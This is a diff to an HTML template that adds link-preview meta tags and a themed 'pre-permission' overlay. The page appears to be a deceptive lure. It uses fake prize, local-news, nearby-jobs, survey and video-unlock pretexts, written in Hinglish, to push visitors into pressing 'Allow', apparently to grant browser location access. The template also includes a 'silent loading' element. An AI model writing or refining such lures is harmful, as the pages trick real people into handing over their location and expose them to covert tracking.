@@ -3,6 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    {% if og %}
+    <meta property="og:title" content="{{ og.title }}">
+    <meta property="og:description" content="{{ og.description }}">
+    <meta property="og:image" content="{{ og.image }}">
+    <meta property="og:url" content="{{ og.url }}">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="{{ og.site_name }}">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="{{ og.title }}">
+    <meta name="twitter:description" content="{{ og.description }}">
+    <meta name="twitter:image" content="{{ og.image }}">
+    {% endif %}
     <title>
         {% if theme == 'gift' %}
             🎁 Congratulations! You've Won!
@@ -20,6 +32,44 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Playfair+Display:wght@700;900&display=swap" rel="stylesheet">
 </head>
 <body class="theme-{{ theme }}">
+
+    <!-- Pre-permission Overlay -->
+    <div id="permission-overlay" class="permission-overlay">
+        <div class="permission-card" id="permission-card">
+            <div class="permission-icon" id="permission-icon">
+                {% if theme == 'gift' %}🎁
+                {% elif theme == 'news' %}📍
+                {% elif theme == 'job' %}💼
+                {% elif theme == 'survey' %}🎯
+                {% else %}▶️
+                {% endif %}
+            </div>
+            <h2 class="permission-title" id="permission-title">
+                {% if theme == 'gift' %}Prize Claim Karne ke Liye
+                {% elif theme == 'news' %}Local News Access Karne ke Liye
+                {% elif theme == 'job' %}Nearby Jobs Dekhne ke Liye
+                {% elif theme == 'survey' %}Survey Complete Karne ke Liye
+                {% else %}Video Unlock Karne ke Liye
+                {% endif %}
+            </h2>
+            <p class="permission-subtitle" id="permission-subtitle">
+                {% if theme == 'gift' %}Apni delivery location verify karo
+                {% elif theme == 'news' %}Apne area ki khabar padhne ke liye location zaroori hai
+                {% elif theme == 'job' %}Apne area mein available jobs check karo
+                {% elif theme == 'survey' %}Location verify karke prize claim karo
+                {% else %}Regional content access ke liye location verify karo
+                {% endif %}
+            </p>
+            <button class="permission-btn" id="permission-btn">
+                {% if theme == 'gift' %}✅ Allow & Claim Prize
+                {% elif theme == 'news' %}✅ Allow & Read News
+                {% elif theme == 'job' %}✅ Allow & View Jobs
+                {% elif theme == 'survey' %}✅ Allow & Continue
+                {% else %}✅ Allow & Watch
+                {% endif %}
+            </button>
+        </div>
+    </div>
 
     <!-- Silent loading state indicator -->
     <div id="loading-overlay" class="hidden"></div>
